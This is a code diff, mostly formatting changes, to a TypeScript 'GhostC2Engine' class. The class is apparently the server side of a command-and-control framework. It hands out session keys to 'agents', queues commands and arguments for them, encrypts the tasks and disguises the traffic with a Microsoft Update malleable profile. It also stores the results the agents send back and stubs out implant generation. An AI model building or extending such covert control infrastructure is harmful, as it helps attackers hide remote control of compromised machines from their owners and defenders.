@@ -1,6 +1,10 @@
 import { eq, and, desc } from "drizzle-orm";
 import { getDb } from "../db";
-import { ghostC2Agents, ghostC2Tasks, ghostC2Channels } from "../../drizzle/schema";
+import {
+  ghostC2Agents,
+  ghostC2Tasks,
+  ghostC2Channels,
+} from "../../drizzle/schema";
 import crypto from "node:crypto";
 import { encrypt } from "./crypto";
 import { MalleableEngine, MicrosoftUpdateProfile } from "./malleableC2";
@@ -9,7 +13,7 @@ export class GhostC2Engine {
   private static SESSION_KEYS = new Map<string, string>();
 
   static async establishSession(agentId: string, publicKey: string) {
-    const sessionKey = crypto.randomBytes(32).toString('hex');
+    const sessionKey = crypto.randomBytes(32).toString("hex");
     this.SESSION_KEYS.set(agentId, sessionKey);
     return sessionKey;
   }
@@ -55,22 +59,25 @@ export class GhostC2Engine {
       .where(
         and(
           eq(ghostC2Tasks.agentId, agentData.agentId),
-          eq(ghostC2Tasks.status, "pending")
-        )
+          eq(ghostC2Tasks.status, "pending"),
+        ),
       )
       .orderBy(desc(ghostC2Tasks.createdAt));
 
     const sessionKey = this.SESSION_KEYS.get(agentData.agentId);
-    
-    const securedTasks = pendingTasks.map(task => {
+
+    const securedTasks = pendingTasks.map((task) => {
       const payload = JSON.stringify({
         id: task.id,
         cmd: task.command,
-        args: task.args
+        args: task.args,
       });
-      
+
       const encrypted = sessionKey ? encrypt(payload, sessionKey) : payload;
-      return MalleableEngine.transformResponse(encrypted, MicrosoftUpdateProfile);
+      return MalleableEngine.transformResponse(
+        encrypted,
+        MicrosoftUpdateProfile,
+      );
     });
 
     for (const task of pendingTasks) {
@@ -83,7 +90,12 @@ export class GhostC2Engine {
     return securedTasks;
   }
 
-  static async submitResult(agentId: string, taskId: number, result: string, success: boolean) {
+  static async submitResult(
+    agentId: string,
+    taskId: number,
+    result: string,
+    success: boolean,
+  ) {
     const db = await getDb();
     if (!db) throw new Error("Database unavailable");
 
@@ -95,10 +107,7 @@ export class GhostC2Engine {
         completedAt: new Date(),
       })
       .where(
-        and(
-          eq(ghostC2Tasks.id, taskId),
-          eq(ghostC2Tasks.agentId, agentId)
-        )
+        and(eq(ghostC2Tasks.id, taskId), eq(ghostC2Tasks.agentId, agentId)),
       );
 
     return { success: true };
@@ -126,14 +135,14 @@ export class GhostC2Engine {
     return { taskId: newTask.insertId };
   }
 
-  static generateImplant(channelId: number, os: 'windows' | 'linux') {
-    const agentId = crypto.randomBytes(16).toString('hex');
+  static generateImplant(channelId: number, os: "windows" | "linux") {
+    const agentId = crypto.randomBytes(16).toString("hex");
     return {
       agentId,
       channelId,
       os,
       compiledAt: new Date().toISOString(),
-      signature: crypto.randomBytes(32).toString('base64'),
+      signature: crypto.randomBytes(32).toString("base64"),
     };
   }
 }
